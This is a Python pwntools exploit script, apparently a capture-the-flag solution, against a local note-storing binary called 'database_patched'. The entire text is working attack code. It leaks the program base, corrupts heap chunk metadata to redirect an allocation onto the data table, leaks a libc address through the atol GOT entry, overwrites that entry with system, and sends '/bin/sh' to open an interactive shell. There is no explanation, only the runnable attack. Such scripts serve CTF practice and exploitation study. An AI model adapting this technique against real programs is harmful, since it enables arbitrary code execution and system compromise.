from pwn import *


context.binary = exe = ELF('./database_patched', checksec=False)
p=process(exe.path)

def insert(length,data):
    p.sendlineafter(b"Enter your choice =>",b"2")
    p.sendafter(b"Please enter the length of string =>",f"{length}".encode())
    p.sendafter(b"Please enter the string you want to save =>",data)

def update(index,length,data):
    p.sendlineafter(b"Enter your choice =>",b"3")
    p.sendlineafter(b"Please enter the index of element =>",f"{index}".encode())
    p.sendlineafter(b"Please enter the length of string =>",f"{length}".encode())
    p.sendafter(b"Please enter the string =>",data)
def show():
    p.sendlineafter(b"Enter your choice =>",b"1")
def delete(index):
    p.sendlineafter(b"Enter your choice =>",b"4")
    p.sendlineafter(b"Please enter the index of element =>",f"{index}".encode())
#####leak#########3
main=int(p.recvuntil(b'You have following options').split(b': ')[1].split(b"\n")[0][2:],16)
log.info("[+]Main:"+hex(main))
exe_base=main-0x1275
log.info("[+]exe base:"+hex(exe_base))
system_plt=exe_base+0x850
atol_got=exe_base+0x201cf8
data_base=exe_base+0x201d88
free_got=exe_base+0x201cc8
#################
insert(0x20,b"A"*16)
insert(0x20,b"A"*16)
insert(0x20,b"A"*16)
avoid_consolide=insert(0x20,b"BATMAN")


delete(2)
delete(1)
payload=b"A"*0x20+p64(0)+p64(0x31)+p64(data_base)
update(0,0x38,payload)
insert(0x20,b"A"*0x20)
insert(0x20,p64(atol_got))
show()
leak2=int.from_bytes(p.recvuntil(b"BATMAN").split(b". ")[1][0:6],"little")
libc=leak2-0x407d0
system=libc+0x4f550
log.info("leak2:"+hex(leak2))
log.info("libc base:"+hex(libc))

update(0,8,p64(system))
p.sendlineafter(b"Enter your choice =>",b"/bin/sh\x00")
p.interactive()